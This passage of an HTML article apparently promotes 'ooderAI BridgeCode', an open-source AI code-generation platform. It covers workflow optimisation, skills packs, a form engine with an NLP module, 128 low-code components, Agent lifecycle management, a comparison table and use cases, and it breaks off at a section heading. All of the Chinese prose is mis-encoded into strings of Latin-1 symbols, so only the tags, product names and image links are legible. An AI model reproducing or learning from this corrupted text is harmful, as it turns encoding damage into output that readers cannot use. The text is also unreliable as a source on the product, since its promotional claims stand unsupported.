<li><strong>é«˜æ•ˆè¿­ä»£</strong>ï¼šç®€åŒ–æµç¨‹ç¯èŠ‚ï¼Œç¼©çŸ­å¼€å‘ã€è°ƒè¯•ã€ä¸Šçº¿çš„å‘¨æœŸï¼Œæ”¯æŒå¿«é€Ÿè¿­ä»£ï¼Œé€‚é…ä¼ä¸šå¿«é€Ÿå“åº”å¸‚åœºéœ€æ±‚çš„åœºæ™¯ï¼›</li>
<li><strong>çµæ´»é€‚é…</strong>ï¼šæµç¨‹å¯æ ¹æ®ä¼ä¸šä¸šåŠ¡å˜åŒ–ã€å›¢é˜Ÿè°ƒæ•´è¿›è¡Œè‡ªå®šä¹‰ä¿®æ”¹ï¼ˆWebç«¯å¯è§†åŒ–æµç¨‹é…ç½®ç•Œé¢ï¼Œæ‹–æ‹½å³å¯è°ƒæ•´èŠ‚ç‚¹ï¼‰ï¼Œæ— éœ€å¤æ‚æ“ä½œã€‚</li>
</ul>
<h4 data-id="heading-8">2.2.2 å›¢é˜Ÿå·¥ä½œæµç¨‹ä¼˜ç¤ºæ„å›¾</h4>
<p>ä»¥ä¸‹ä¸º BridgeCode ä¼˜åŒ–åçš„AIæ—¶ä»£ä¼ä¸šç¼–ç¨‹å›¢é˜Ÿå·¥ä½œæµç»˜å›¾</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f62bbaacc1d14ab3b2228f2a3420fcf1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770900704&amp;x-signature=1MU65YOFLxpSzBC%2FhE21ag47YXU%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<h4 data-id="heading-9">2.2.2 å…¨å¥— skills èƒ½åŠ›åŒ…è¾…åŠ©æ­å»º</h4>
<p>skills èƒ½åŠ›åŒ…æ˜¯ä¼ä¸šç¼–ç¨‹å›¢é˜Ÿçš„â€œèƒ½åŠ›æ‰‹å†Œâ€ï¼Œæ¶µç›–ç¼–ç¨‹è§„èŒƒã€æŠ€æœ¯æŠ€å·§ã€å·¥å…·ä½¿ç”¨ã€é—®é¢˜è§£å†³æ–¹æ¡ˆç­‰æ ¸å¿ƒå†…å®¹ï¼ŒBridgeCode ç»“åˆä¼ä¸šæŠ€æœ¯æ ˆä¸å·¥ä½œæµç¨‹ï¼Œè¾…åŠ©ä¼ä¸šæ­å»ºå…¨å¥—ã€ä¸“å±çš„ skills èƒ½åŠ›åŒ…ï¼ŒåŠ©åŠ›å›¢é˜Ÿèƒ½åŠ›æ ‡å‡†åŒ–ã€æå‡å›¢é˜Ÿæ•´ä½“ç¼–ç¨‹æ°´å¹³ã€‚</p>
<p>èƒ½åŠ›åŒ…æ­å»ºæ ¸å¿ƒæ”¯æŒï¼š</p>
<ul>
<li><strong>å†…å®¹ä¸ªæ€§åŒ–</strong>ï¼šåŸºäºä¼ä¸šæŠ€æœ¯è·¯çº¿ï¼ˆå¦‚Javaã€Vueã€Reactç­‰ï¼‰ä¸ç¼–ç¨‹éœ€æ±‚ï¼Œè‡ªåŠ¨ç”Ÿæˆè´´åˆä¼ä¸šå®é™…çš„ skills å†…å®¹ï¼Œé¿å…å†—ä½™ã€æ— ç”¨ä¿¡æ¯ï¼›</li>
<li><strong>ä½“ç³»åŒ–æ¢³ç†</strong>ï¼šå°† skills å†…å®¹æŒ‰â€œç¼–ç¨‹è§„èŒƒã€æŠ€æœ¯æŠ€å·§ã€å·¥å…·ä½¿ç”¨ã€é”™è¯¯æ’æŸ¥ã€é€‚é…æ–¹æ¡ˆâ€ç­‰æ¨¡å—åˆ†ç±»æ¢³ç†ï¼Œç»“æ„æ¸…æ™°ï¼Œä¾¿äºå›¢é˜ŸæŸ¥è¯¢ã€å­¦ä¹ ï¼›</li>
<li><strong>å®æ—¶æ›´æ–°</strong>ï¼šå½“ä¼ä¸šæŠ€æœ¯æ ˆå‡çº§ã€å·¥ä½œæµç¨‹ä¼˜åŒ–æˆ–è¡Œä¸šå‡ºç°æ–°æŠ€æœ¯æ—¶ï¼Œè‡ªåŠ¨æ›´æ–° skills èƒ½åŠ›åŒ…å†…å®¹ï¼Œç¡®ä¿å›¢é˜ŸæŒæ¡æœ€æ–°ã€æœ€é€‚é…çš„æŠ€æœ¯èƒ½åŠ›ï¼›</li>
<li><strong>WebåŒ–å…±äº«</strong>ï¼šskills èƒ½åŠ›åŒ…æ”¯æŒWebç«¯åœ¨çº¿æŸ¥çœ‹ã€æœç´¢ã€ä¸‹è½½ã€åˆ†äº«ï¼Œå›¢é˜Ÿæˆå‘˜å¯éšæ—¶æŸ¥é˜…å­¦ä¹ ï¼Œå®ç°çŸ¥è¯†å…±äº«ï¼Œæå‡å›¢é˜Ÿæ•´ä½“æ•ˆç‡ã€‚</li>
</ul>
<h2 data-id="heading-10">ä¸‰ã€äº§å“æ ¸å¿ƒç‰¹ç‚¹ï¼šå¼€æºçµæ´»ï¼Œå…¨æ–¹ä½é€‚é…ä¼ä¸šéœ€æ±‚</h2>
<p>ooderAI BridgeCode ä»¥â€œä¼ä¸šéœ€æ±‚ä¸ºæ ¸å¿ƒâ€ï¼Œç»“åˆAIæŠ€æœ¯ä¸å¼€æºç”Ÿæ€ï¼Œæ‰“é€ å››å¤§æ ¸å¿ƒç‰¹ç‚¹ï¼Œå…¼é¡¾çµæ´»æ€§ã€å®ç”¨æ€§ã€æ˜“ç”¨æ€§ï¼Œé€‚é…ä¸åŒè§„æ¨¡ã€ä¸åŒæŠ€æœ¯è·¯çº¿çš„ä¼ä¸šéœ€æ±‚ï¼ŒåŒæ—¶æ³¨é‡WebåŒ–ç¾åŒ–é€‚é…ï¼Œæå‡ç”¨æˆ·æ“ä½œä½“éªŒã€‚</p>
<h3 data-id="heading-11">3.1 æ ¸å¿ƒæŠ€æœ¯æ¶æ„ï¼šooder è¡¨å•å¼•æ“ + ooder-nlpModule è‡ªç„¶è¯­è¨€æ¨¡å‹</h3>
<p>äº§å“åº•å±‚ä¾æ‰˜ä¸¤å¤§æ ¸å¿ƒæŠ€æœ¯æ¶æ„ï¼Œç¡®ä¿ä»£ç ç”Ÿæˆçš„å‡†ç¡®æ€§ã€æ•ˆç‡ä¸çµæ´»æ€§ï¼ŒåŒæ—¶ä¸ºWebåŒ–æ“ä½œã€å¯è§†åŒ–è®¾è®¡æä¾›åšå®æ”¯æ’‘ï¼š</p>
<ul>
<li><strong>ooder è¡¨å•å¼•æ“</strong>ï¼šæä¾›å¼ºå¤§çš„è¡¨å•è®¾è®¡ã€æ•°æ®äº¤äº’èƒ½åŠ›ï¼Œæ”¯æ’‘ BridgeCode Webç«¯å¯è§†åŒ–æ“ä½œç•Œé¢ï¼ˆå¦‚æµç¨‹é…ç½®ã€å‚æ•°è®¾ç½®ã€ä»£ç è°ƒè¯•ç­‰ï¼‰ï¼Œç•Œé¢ç¾è§‚ã€æ“ä½œä¾¿æ·ï¼Œé€‚é…ä¼ä¸šå„ç±»ç»ˆç«¯ï¼ˆç”µè„‘ã€å¹³æ¿ï¼‰Webè®¿é—®éœ€æ±‚ï¼›åŒæ—¶æ”¯æŒè¡¨å•æ•°æ®ä¸ä»£ç ç”Ÿæˆé€»è¾‘çš„æ— ç¼è”åŠ¨ï¼Œç¡®ä¿æ“ä½œä¸ç»“æœçš„å®æ—¶åŒæ­¥ã€‚</li>
<li><strong>ooder-nlpModule è‡ªç„¶è¯­è¨€æ¨¡å‹</strong>ï¼šæ ¸å¿ƒæ”¯æ’‘è‡ªå­¦ä¹ èƒ½åŠ›ä¸å·¥ä½œæµç¨‹ä¼˜åŒ–ï¼Œèƒ½å¤Ÿç²¾å‡†è¯†åˆ«ä¼ä¸šæŠ€æœ¯æ–‡æ¡£ã€ä»£ç æ³¨é‡Šä¸­çš„è‡ªç„¶è¯­è¨€ä¿¡æ¯ï¼Œæ·±åº¦ç†è§£ä¼ä¸šç¼–ç¨‹éœ€æ±‚ä¸æŠ€æœ¯è§„èŒƒï¼ŒåŒæ—¶æ”¯æŒè‡ªç„¶è¯­è¨€æŒ‡ä»¤æ“ä½œï¼ˆå¦‚é€šè¿‡è‡ªç„¶è¯­è¨€ä¸‹è¾¾ä»£ç ç”Ÿæˆã€æµç¨‹è°ƒæ•´æŒ‡ä»¤ï¼‰ï¼Œé™ä½æ“ä½œé—¨æ§›ï¼Œè®©éä¸“ä¸šå¼€å‘äººå‘˜ä¹Ÿèƒ½å¿«é€Ÿä¸Šæ‰‹ã€‚</li>
</ul>
<p>ä¸¤å¤§æŠ€æœ¯æ¶æ„æ·±åº¦èåˆï¼Œæ—¢ç¡®ä¿äº†ä»£ç ç”Ÿæˆçš„æŠ€æœ¯ç¨³å®šæ€§ï¼Œåˆæå‡äº†äº§å“çš„æ˜“ç”¨æ€§ä¸WebåŒ–é€‚é…æ€§ï¼Œå®ç°â€œæŠ€æœ¯ä¸“ä¸šã€æ“ä½œç®€å•â€çš„åŒé‡ä¼˜åŠ¿ã€‚</p>
<h4 data-id="heading-12">3.1.1 æ ¸å¿ƒæŠ€æœ¯æ¶æ„</h4>
<p>ä»¥ä¸‹ä¸º ooderAI BridgeCode æ ¸å¿ƒæŠ€æœ¯æ¶æ„ç¤ºæ„å›¾</p>
<p>â€‹</p>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9422b5e39d8f445fbfa73f37d6b7a2f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770900704&amp;x-signature=5JsSTOP4KIvwGpDVDtLfuHoF16M%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p>â€‹</p>
<h3 data-id="heading-13">3.2 å¼€æºè®¾è®¡ï¼šæ— æŠ€æœ¯ç»‘å®šï¼Œè‡ªä¸»å¯æ§</h3>
<p>BridgeCode é‡‡ç”¨å…¨å¼€æºè®¾è®¡ï¼Œå½»åº•æ‰“ç ´â€œæŠ€æœ¯ç»‘å®šâ€å£å’ï¼Œè®©ä¼ä¸šæ‹¥æœ‰ç»å¯¹çš„è‡ªä¸»æ§åˆ¶æƒï¼Œæ— éœ€æ‹…å¿ƒä¾èµ–ç¬¬ä¸‰æ–¹å·¥å…·å¯¼è‡´çš„å‡çº§å—é™ã€æˆæœ¬å¢åŠ ç­‰é—®é¢˜ï¼Œæ˜¯ä¼ä¸šé•¿æœŸæ•°å­—åŒ–è½¬å‹çš„å¯é é€‰æ‹©ã€‚</p>
<p>å¼€æºæ ¸å¿ƒä¼˜åŠ¿ï¼š</p>
<ul>
<li><strong>æ— æŠ€æœ¯æ ˆç»‘å®š</strong>ï¼šæ”¯æŒJavaã€Vueã€Reactã€Pythonç­‰å¤šç§ä¸»æµæŠ€æœ¯æ ˆï¼Œä¼ä¸šå¯ä¿ç•™ç°æœ‰æŠ€æœ¯æ ˆï¼Œæ— éœ€é‡æ„ç³»ç»Ÿï¼Œç›´æ¥é€‚é…ä½¿ç”¨ï¼›</li>
<li><strong>ä»£ç è‡ªä¸»å¯æ§</strong>ï¼šå¼€æºå…¨éƒ¨æ ¸å¿ƒä»£ç ï¼Œä¼ä¸šå¯æ ¹æ®è‡ªèº«éœ€æ±‚è¿›è¡ŒäºŒæ¬¡å¼€å‘ã€å®šåˆ¶ä¿®æ”¹ï¼Œä¼˜åŒ–ä»£ç ç”Ÿæˆé€»è¾‘ã€å·¥ä½œæµç¨‹æˆ–Webç«¯æ“ä½œç•Œé¢ï¼Œè´´åˆä¼ä¸šä¸ªæ€§åŒ–éœ€æ±‚ï¼›</li>
<li><strong>å…è´¹æ— é—¨æ§›</strong>ï¼šæ ¸å¿ƒåŠŸèƒ½å®Œå…¨å…è´¹ï¼Œæ— licenseé™åˆ¶ï¼Œä¼ä¸šæ— éœ€æ”¯ä»˜é«˜é¢è´¹ç”¨å³å¯ä½¿ç”¨å…¨éƒ¨æ ¸å¿ƒèƒ½åŠ›ï¼Œé™ä½ä¼ä¸šæˆæœ¬ï¼›</li>
<li><strong>ç¤¾åŒºæ”¯æ’‘</strong>ï¼šæ‹¥æœ‰å®Œå–„çš„å¼€æºç¤¾åŒºï¼Œèšé›†å¤§é‡æŠ€æœ¯å¼€å‘è€…ï¼Œä¼ä¸šå¯åœ¨ç¤¾åŒºè·å–æŠ€æœ¯æ”¯æŒã€åˆ†äº«ç»éªŒã€è·å–æœ€æ–°å‡çº§åŒ…ï¼Œå¿«é€Ÿè§£å†³ä½¿ç”¨è¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜ã€‚</li>
</ul>
<h3 data-id="heading-14">3.3 å…¨ç³»åˆ—å¼€æºå¯è§†åŒ–å·¥å…·ï¼š128ä¸ªç»„ä»¶ï¼ŒåŠ©åŠ›ä½ä»£ç å¼€å‘</h3>
<p>BridgeCode é…å¥—æä¾›å…¨ç³»åˆ—å¼€æºå¯è§†åŒ–å·¥å…·ï¼Œæ¶µç›–128ä¸ªå¸¸ç”¨ç»„ä»¶ï¼Œæ‰“é€ å…¨å¥—å‰ç«¯å¯è§†åŒ– skills è¾…åŠ©ä½ä»£ç ç»„ä»¶ç”Ÿæˆå™¨ï¼Œå…¼é¡¾ä¸“ä¸šå¼€å‘äººå‘˜ä¸éä¸“ä¸šäººå‘˜çš„ä½¿ç”¨éœ€æ±‚ï¼Œè¿›ä¸€æ­¥é™ä½ä¼ä¸šç¼–ç¨‹é—¨æ§›ï¼Œæå‡å¼€å‘æ•ˆç‡ï¼ŒåŒæ—¶æ‰€æœ‰å·¥å…·å‡é‡‡ç”¨WebåŒ–ç¾åŒ–è®¾è®¡ï¼Œç•Œé¢ç®€æ´ã€äº¤äº’æµç•…ã€‚</p>
<p>æ ¸å¿ƒå·¥å…·ä¸ç»„ä»¶ä¼˜åŠ¿ï¼š</p>
<ul>
<li><strong>ç»„ä»¶ä¸°å¯Œå…¨é¢</strong>ï¼š128ä¸ªç»„ä»¶è¦†ç›–å‰ç«¯å¼€å‘ã€è¡¨å•è®¾è®¡ã€æ•°æ®å¯è§†åŒ–ã€äº¤äº’æ“ä½œç­‰å…¨åœºæ™¯ï¼ŒåŒ…æ‹¬æŒ‰é’®ã€è¾“å…¥æ¡†ã€è¡¨æ ¼ã€å›¾è¡¨ã€å¼¹çª—ã€å¯¼èˆªç­‰å¸¸ç”¨ç»„ä»¶ï¼Œæ— éœ€äººå·¥é‡å¤å¼€å‘ï¼›</li>
<li><strong>å¯è§†åŒ–ä½ä»£ç å¼€å‘</strong>ï¼šæ”¯æŒæ‹–æ‹½å¼ç»„ä»¶å¸ƒå±€ã€å¯è§†åŒ–å‚æ•°é…ç½®ï¼Œéä¸“ä¸šå¼€å‘äººå‘˜å¯é€šè¿‡ç®€å•æ‹–æ‹½ã€å‹¾é€‰ï¼Œå¿«é€Ÿç”Ÿæˆå‰ç«¯ç»„ä»¶ä»£ç ï¼Œä¸“ä¸šå¼€å‘äººå‘˜å¯åœ¨æ­¤åŸºç¡€ä¸Šè¿›è¡Œä¼˜åŒ–ï¼Œå…¼é¡¾æ•ˆç‡ä¸çµæ´»æ€§ï¼›</li>
<li><strong>å¼€æºå¯æ‰©å±•</strong>ï¼šæ‰€æœ‰å¯è§†åŒ–å·¥å…·ä¸ç»„ä»¶å‡å¼€æºï¼Œä¼ä¸šå¯æ ¹æ®è‡ªèº«éœ€æ±‚æ‰©å±•ç»„ä»¶åŠŸèƒ½ã€æ–°å¢è‡ªå®šä¹‰ç»„ä»¶ï¼Œé€‚é…ä¼ä¸šä¸ªæ€§åŒ–å‰ç«¯å¼€å‘éœ€æ±‚ï¼›</li>
<li><strong>WebåŒ–é€‚é…</strong>ï¼šæ‰€æœ‰å¯è§†åŒ–å·¥å…·å‡æ”¯æŒWebç«¯æ“ä½œï¼Œç»„ä»¶ç”Ÿæˆåå¯ç›´æ¥åœ¨Webç«¯é¢„è§ˆã€ä¿®æ”¹ã€å¯¼å‡ºï¼Œé€‚é…ä¼ä¸šWebç«¯å¼€å‘æµç¨‹ï¼ŒåŒæ—¶æ”¯æŒå“åº”å¼è®¾è®¡ï¼Œé€‚é…ä¸åŒå±å¹•å°ºå¯¸ã€‚</li>
</ul>
<p>å…¨å¥—å‰ç«¯å¯è§†åŒ– skills åŒæ­¥é…å¥—ï¼Œè¯¦ç»†è¯´æ˜å„ç»„ä»¶çš„ä½¿ç”¨æ–¹æ³•ã€é€‚é…åœºæ™¯ã€ä»£ç ç¤ºä¾‹ï¼Œè¾…åŠ©å›¢é˜Ÿå¿«é€ŸæŒæ¡å·¥å…·ä½¿ç”¨æŠ€å·§ï¼Œè¿›ä¸€æ­¥æå‡å¼€å‘æ•ˆç‡ã€‚</p>
<h3 data-id="heading-15">3.4 å®Œå–„å®Œæ•´å¼€æºçš„ Agent ç®¡ç†æ–¹æ¡ˆ</h3>
<p>é’ˆå¯¹AIæ—¶ä»£ä¼ä¸šç¼–ç¨‹çš„æ™ºèƒ½åŒ–éœ€æ±‚ï¼ŒBridgeCode æä¾›å®Œå–„å®Œæ•´çš„å¼€æº Agent ç®¡ç†æ–¹æ¡ˆï¼Œå®ç°AI Agent çš„å…¨ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼ŒåŠ©åŠ›ä¼ä¸šæ­å»ºæ™ºèƒ½åŒ–ç¼–ç¨‹è¾…åŠ©ä½“ç³»ï¼Œè¿›ä¸€æ­¥é‡Šæ”¾AIæŠ€æœ¯çš„ä»·å€¼ï¼ŒåŒæ—¶ç®¡ç†æ–¹æ¡ˆé‡‡ç”¨WebåŒ–å¯è§†åŒ–ç®¡ç†ç•Œé¢ï¼Œä¾¿äºä¼ä¸šç»Ÿä¸€ç®¡æ§ã€‚</p>
<p>Agent ç®¡ç†æ–¹æ¡ˆæ ¸å¿ƒåŠŸèƒ½ï¼š</p>
<ul>
<li><strong>Agent å¿«é€Ÿéƒ¨ç½²</strong>ï¼šæä¾›å¼€æºçš„ Agent æ¨¡æ¿ï¼Œä¼ä¸šå¯å¿«é€Ÿéƒ¨ç½²é€‚é…è‡ªèº«éœ€æ±‚çš„AI Agentï¼ˆå¦‚ä»£ç å®¡æŸ¥Agentã€é”™è¯¯æ’æŸ¥Agentã€ä»£ç ä¼˜åŒ–Agentç­‰ï¼‰ï¼Œæ— éœ€ä»é›¶å¼€å‘ï¼›</li>
<li><strong>å…¨ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong>ï¼šæ”¯æŒ Agent çš„åˆ›å»ºã€é…ç½®ã€å¯åŠ¨ã€åœæ­¢ã€æ›´æ–°ã€åˆ é™¤ç­‰å…¨æµç¨‹ç®¡ç†ï¼ŒWebç«¯å¯è§†åŒ–ç®¡æ§ç•Œé¢ï¼Œå¯å®æ—¶æŸ¥çœ‹ Agent è¿è¡ŒçŠ¶æ€ã€æ‰§è¡Œæ—¥å¿—ï¼Œä¾¿äºè¿ç»´ç®¡ç†ï¼›</li>
<li><strong>ä¸ªæ€§åŒ–é…ç½®</strong>ï¼šå¯æ ¹æ®ä¼ä¸šç¼–ç¨‹éœ€æ±‚ï¼Œè‡ªå®šä¹‰ Agent çš„åŠŸèƒ½ã€æ‰§è¡Œé€»è¾‘ã€è§¦å‘æ¡ä»¶ï¼Œè®© Agent æ›´è´´åˆä¼ä¸šå®é™…éœ€æ±‚ï¼›</li>
<li><strong>å¼€æºå¯æ‰©å±•</strong>ï¼šAgent ç®¡ç†æ–¹æ¡ˆå…¨éƒ¨å¼€æºï¼Œä¼ä¸šå¯æ‰©å±• Agent ç±»å‹ã€ä¼˜åŒ–ç®¡ç†é€»è¾‘ï¼Œé€‚é…ä¼ä¸šAIåŒ–å‡çº§çš„é•¿æœŸéœ€æ±‚ï¼ŒåŒæ—¶æ”¯æŒä¸ä¼ä¸šç°æœ‰è¿ç»´ç®¡ç†ç³»ç»Ÿæ— ç¼å¯¹æ¥ã€‚</li>
</ul>
<h4 data-id="heading-16">3.4.1 Agent å…¨ç”Ÿå‘½å‘¨æœŸç®¡ç†æµç¨‹Webç»˜å›¾</h4>
<p>ä»¥ä¸‹ä¸º BridgeCode Agent ç®¡ç†æ–¹æ¡ˆçš„å…¨ç”Ÿå‘½å‘¨æœŸæµç¨‹ç¤ºæ„å›¾ï¼š</p>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7c7e3c3ec82456bb4f707ef11cfda78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770900704&amp;x-signature=zJ4u1zkP5nISSlE7XC2R9qqt%2Bog%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p>â€‹</p>
<h2 data-id="heading-17">å››ã€äº§å“ä¼˜åŠ¿ï¼šå¯¹æ¯”ä¼ ç»Ÿæ–¹æ¡ˆï¼Œæ‰“é€ æ ¸å¿ƒç«äº‰åŠ›</h2>








































<table><thead><tr><th align="left">å¯¹æ¯”ç»´åº¦</th><th align="left">ä¼ ç»Ÿä»£ç ç”Ÿæˆå·¥å…·/æ–¹æ¡ˆ</th><th align="left">ooderAI BridgeCode</th></tr></thead><tbody><tr><td align="left">ä»£ç ç”Ÿæˆé€‚é…æ€§</td><td align="left">æ ‡å‡†åŒ–æ¨¡æ¿ï¼Œéœ€äººå·¥å¤§é‡ä¿®æ”¹ï¼Œéš¾ä»¥è´´åˆä¼ä¸šä¸ªæ€§åŒ–æŠ€æœ¯è·¯çº¿</td><td align="left">è‡ªå­¦ä¹ èƒ½åŠ›ï¼Œè‡ªåŠ¨é€‚é…ä¼ä¸šä»£ç ç‰¹ç‚¹ä¸æŠ€æœ¯è·¯çº¿ï¼Œç”Ÿæˆä¸“å±ä»£ç ï¼Œæ— éœ€äºŒæ¬¡ä¿®æ”¹</td></tr><tr><td align="left">æ–°æ—§ç³»ç»Ÿè¡”æ¥</td><td align="left">è¡”æ¥ç¹çï¼Œéœ€äººå·¥ç¼–å†™å¤§é‡é€‚é…ä»£ç ï¼Œæ˜“å‡ºç°å…¼å®¹é—®é¢˜</td><td align="left">è‡ªåŠ¨ç”Ÿæˆè¡”æ¥ä»£ç ï¼Œæ— ç¼è¡”æ¥å·²æœ‰åº”ç”¨ä¸ ooderAI ä»£ç ï¼Œç¨³å®šæ— å¼‚å¸¸</td></tr><tr><td align="left">æŠ€æœ¯ç»‘å®š</td><td align="left">å¤šä¸ºé—­æºæ–¹æ¡ˆï¼Œç»‘å®šç‰¹å®šæŠ€æœ¯æ ˆï¼Œå‡çº§å—é™</td><td align="left">å…¨å¼€æºè®¾è®¡ï¼Œæ— æŠ€æœ¯ç»‘å®šï¼Œæ”¯æŒå¤šæŠ€æœ¯æ ˆé€‚é…ï¼Œå¯è‡ªä¸»äºŒæ¬¡å¼€å‘</td></tr><tr><td align="left">å¯è§†åŒ–ä¸æ˜“ç”¨æ€§</td><td align="left">å¤šä¸ºå‘½ä»¤è¡Œæ“ä½œæˆ–ç®€å•ç•Œé¢ï¼Œå¯è§†åŒ–ç¨‹åº¦ä½ï¼Œæ“ä½œå¤æ‚</td><td align="left">å…¨WebåŒ–ç¾åŒ–è®¾è®¡ï¼Œå¯è§†åŒ–æ“ä½œç•Œé¢ï¼Œæ‹–æ‹½å¼é…ç½®ï¼Œ128ä¸ªå¯è§†åŒ–ç»„ä»¶è¾…åŠ©ï¼Œæ˜“ç”¨æ€§å¼º</td></tr><tr><td align="left">AIæ—¶ä»£é€‚é…æ€§</td><td align="left">æ— AIè‡ªå­¦ä¹ èƒ½åŠ›ï¼Œä¸æ”¯æŒå·¥ä½œæµç¨‹ä¼˜åŒ–ä¸ Agent ç®¡ç†</td><td align="left">å†…ç½®AIè‡ªå­¦ä¹ ç®—æ³•ï¼Œä¼˜åŒ–AIæ—¶ä»£å·¥ä½œæµç¨‹ï¼Œæä¾›å®Œæ•´å¼€æº Agent ç®¡ç†æ–¹æ¡ˆ</td></tr><tr><td align="left">æˆæœ¬æ§åˆ¶</td><td align="left">é—­æºæ–¹æ¡ˆè´¹ç”¨é«˜æ˜‚ï¼ŒäºŒæ¬¡å¼€å‘æˆæœ¬é«˜</td><td align="left">æ ¸å¿ƒåŠŸèƒ½å…è´¹å¼€æºï¼Œæ— licenseè´¹ç”¨ï¼ŒäºŒæ¬¡å¼€å‘æˆæœ¬ä½ï¼Œé™ä½ä¼ä¸šäººåŠ›ä¸èµ„é‡‘æˆæœ¬</td></tr></tbody></table>
<h2 data-id="heading-18">äº”ã€é€‚ç”¨åœºæ™¯ï¼šè¦†ç›–å…¨è¡Œä¸šä¼ä¸šç¼–ç¨‹éœ€æ±‚</h2>
<p>ooderAI BridgeCode å‡­å€Ÿå…¶çµæ´»æ€§ã€é€‚é…æ€§ä¸æ˜“ç”¨æ€§ï¼Œå¯å¹¿æ³›åº”ç”¨äºå„ç±»è§„æ¨¡ã€å„ç±»è¡Œä¸šçš„ä¼ä¸šï¼Œå°¤å…¶é€‚åˆé¢ä¸´â€œä»£ç è¡”æ¥å›°éš¾ã€å¼€å‘æ•ˆç‡ä½ä¸‹ã€æŠ€æœ¯æ ˆå¤šæ ·ã€AIåŒ–è½¬å‹éœ€æ±‚è¿«åˆ‡â€çš„ä¼ä¸šï¼Œæ ¸å¿ƒé€‚ç”¨åœºæ™¯å¦‚ä¸‹ï¼š</p>
<h3 data-id="heading-19">5.1 ä¸­å°ä¼ä¸šç¼–ç¨‹æ•ˆç‡æå‡</h3>
<p>ä¸­å°ä¼ä¸šå›¢é˜Ÿè§„æ¨¡å°ã€å¼€å‘äººåŠ›æœ‰é™ï¼Œé¢ä¸´â€œä¸€äººå¤šå²—ã€å¼€å‘å‘¨æœŸç´§å¼ â€çš„é—®é¢˜ã€‚BridgeCode è‡ªåŠ¨ç”Ÿæˆä»£ç ã€ç®€åŒ–å·¥ä½œæµç¨‹çš„èƒ½åŠ›ï¼Œå¯å¤§å¹…å‡å°‘æ‰‹åŠ¨ç¼–ç å·¥ä½œé‡ï¼Œè®©å¼€å‘äººå‘˜èšç„¦æ ¸å¿ƒä¸šåŠ¡å¼€å‘ï¼ŒåŒæ—¶ä½é—¨æ§›çš„å¯è§†åŒ–æ“ä½œçš„è®©éä¸“ä¸šäººå‘˜ä¹Ÿèƒ½å‚ä¸åŸºç¡€ä»£ç ç”Ÿæˆï¼Œè¿›ä¸€æ­¥æå‡å›¢é˜Ÿæ•ˆç‡ï¼Œé™ä½äººåŠ›æˆæœ¬ã€‚</p>
<h3 data-id="heading-20">5.2 å¤§å‹ä¼ä¸šæŠ€æœ¯ä½“ç³»è¡”æ¥ä¸æ ‡å‡†åŒ–</h3>
<p>å¤§å‹ä¼ä¸šæŠ€æœ¯æ ˆå¤šæ ·ã€å·²æœ‰ç³»ç»Ÿç¹æ‚ï¼Œä¸åŒéƒ¨é—¨å¯èƒ½é‡‡ç”¨ä¸åŒçš„æŠ€æœ¯è·¯çº¿ï¼Œå¯¼è‡´ä»£ç è¡”æ¥å›°éš¾ã€å·¥ä½œæµç¨‹ä¸ç»Ÿä¸€ã€‚BridgeCode æ”¯æŒå¤šæŠ€æœ¯æ ˆé€‚é…ã€è‡ªåŠ¨ç”Ÿæˆè¡”æ¥ä»£ç ï¼Œå¯æ‰“é€šå„éƒ¨é—¨æŠ€æœ¯æ–­å±‚ï¼›åŒæ—¶å¯ä¼˜åŒ–å·¥ä½œæµç¨‹ã€æ­å»ºæ ‡å‡†åŒ– skills èƒ½åŠ›åŒ…ï¼Œå®ç°ä¼ä¸šç¼–ç¨‹å·¥ä½œçš„æ ‡å‡†åŒ–ã€è§„èŒƒåŒ–ï¼Œæå‡å›¢é˜ŸååŒæ•ˆç‡ã€‚</p>
<h3 data-id="heading-21">5.3 ä¼ä¸šAIåŒ–ç¼–ç¨‹è½¬å‹</h3>
<p>å¸Œæœ›å¼•å…¥AIæŠ€æœ¯ä¼˜åŒ–ç¼–ç¨‹å·¥ä½œã€æå‡æ™ºèƒ½åŒ–æ°´å¹³çš„ä¼ä¸šï¼ŒBridgeCode æä¾›çš„AIè‡ªå­¦ä¹ èƒ½åŠ›ã€Agent ç®¡ç†æ–¹æ¡ˆä¸AIæ—¶ä»£å·¥ä½œæµç¨‹ä¼˜åŒ–èƒ½åŠ›ï¼Œå¯åŠ©åŠ›ä¼ä¸šå¿«é€Ÿæ­å»ºæ™ºèƒ½åŒ–ç¼–ç¨‹ä½“ç³»ï¼Œå®ç°ä»£ç ç”Ÿæˆã€å®¡æŸ¥ã€ä¼˜åŒ–çš„æ™ºèƒ½åŒ–ï¼Œæ¨åŠ¨ä¼ä¸šç¼–ç¨‹å·¥ä½œå‘AIåŒ–è½¬å‹ã€‚</p>
<h3 data-id="heading-22">5.4 ä½ä»£ç å¼€å‘å›¢é˜Ÿæ”¯æ’‘</h3>
